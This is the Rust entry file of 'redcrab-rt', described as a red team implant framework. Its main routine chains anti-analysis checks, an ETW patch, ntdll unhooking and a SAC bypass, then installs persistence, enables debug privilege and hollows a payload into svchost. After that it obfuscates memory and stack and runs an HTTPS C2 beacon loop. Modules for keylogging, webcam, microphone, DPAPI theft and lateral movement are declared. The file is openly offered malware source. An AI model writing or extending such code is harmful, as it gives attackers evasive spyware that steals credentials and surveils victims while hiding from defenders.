//! redcrab-rt — red team implant framework
//! Build: python builder.py

#![no_main]
#![allow(unused_imports, dead_code)]

mod defs;
mod utils;
mod hashes;
mod syscall;
mod indirect_syscall;
mod ssn_audit;
mod loader;
mod stomp;
mod spoof;
mod sleep;
mod etw_patch;
mod unhook;
mod sac_bypass;
mod ppldump;
mod pe_obfuscate;
mod threadless_inject;
mod screenshot;
mod webcam;
mod mic;
mod filetransfer;
mod selfdestruct;
mod antidetect;
mod guardian;
mod watchdog;
mod resurrect;
mod persist;
mod hollow;
mod post_shutdown;
// ── new modules ──────────────────────────────────────────────────────────────
mod keylog;
mod token;
mod dpapi;
mod lateral;
// ────────────────────────────────────────────────────────────────────────────
mod c2;

use defs::*;

const PAYLOAD: &[u8] = &[0x90];

// Patched by builder.py at pack time
pub const SLEEP_KEY: [u8; 16] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
];

#[no_mangle]
pub extern "system" fn WinMainCRTStartup() {
    unsafe { run() };
}

unsafe fn run() {
    // ── Phase 0: resolve all NT function pointers up-front ────────────────
    let fn_ntqsi    = indirect_syscall::resolve_ntqsi();
    let fn_sleep_ms = indirect_syscall::resolve_sleep();
    let fn_tick     = indirect_syscall::resolve_tick();

    // ── Phase 1: SSN audit ────────────────────────────────────────────────
    ssn_audit::verify_critical_ssns();

    // ── Phase 2: Environment gate ─────────────────────────────────────────
    antidetect::check_environment();

    // ── Phase 3: VEH ─────────────────────────────────────────────────────
    let fn_add_veh = indirect_syscall::resolve_add_veh();
    guardian::install_veh(fn_add_veh, selfdestruct::full_destruct);

    // ── Phase 4: Ctrl handler ─────────────────────────────────────────────
    selfdestruct::register_ctrl_handler();

    // ── Phase 5: Bypass layer ─────────────────────────────────────────────
    sac_bypass::bypass_sac();
    unhook::unhook_ntdll();
    etw_patch::apply_all_blinds();

    // ── Phase 6: Persistence ──────────────────────────────────────────────
    let own_path = own_path_via_peb();
    persist::install(&own_path);

    // ── Phase 6b: Token escalation — grab SYSTEM early if possible ────────
    // Best-effort: fails silently if PPL is still up or we're not admin yet.
    // ppldump will strip PPL later; token module retries on demand via C2.
    token::enable_debug_privilege();

    // ── Phase 7: Guardian thread ───────────────────────────────────────────
    guardian::start_thread(
        fn_ntqsi,
        fn_sleep_ms,
        fn_tick,
        selfdestruct::wipe_self,
        persist::purge_all,
        resurrect::drop_from_ads,
        persist::install_all,
        || {
            let mut buf = PAYLOAD.to_vec();
            pe_obfuscate::xor_payload_inplace(&mut buf, &SLEEP_KEY);
            pe_obfuscate::xor_payload_inplace(&mut buf, &SLEEP_KEY);
            let ok = hollow::hollow_into_svchost(&buf);
            if ok {
                post_shutdown::install_wnf_channel(&own_path);
            }
            ok
        },
    );

    // ── Phase 8: Sleep obfuscation ────────────────────────────────────────
    sleep::obfuscated_sleep(500, &SLEEP_KEY);

    // ── Phase 9: Hollow into svchost ──────────────────────────────────────
    let mut payload_buf = PAYLOAD.to_vec();
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);
    hollow::hollow_into_svchost(&payload_buf);

    // ── Phase 10: Post-injection concealment ──────────────────────────────
    stomp::stomp(0 as _, 0 as _, payload_buf.len());
    spoof::spoof_stack();
    pe_obfuscate::secure_zero(&mut payload_buf);

    // ── Phase 11: C2 beacon loop (HTTPS + jitter) ─────────────────────────
    c2::callback_and_loop();

    // ── Phase 12: Clean exit ──────────────────────────────────────────────
    persist::uninstall();
    selfdestruct::destruct();
}

unsafe fn own_path_via_peb() -> String {
    let peb: *const u8;
    core::arch::asm!(
        "mov {p}, gs:[0x60]",
        p = out(reg) peb,
    );
    let proc_params = *(peb.add(0x20) as *const *const u8);
    let img_len  = *(proc_params.add(0x60) as *const u16) as usize;
    let img_buf  = *(proc_params.add(0x68) as *const *const u16);
    let char_cnt = img_len / 2;
    let wide = core::slice::from_raw_parts(img_buf, char_cnt);
    String::from_utf16_lossy(wide)
}
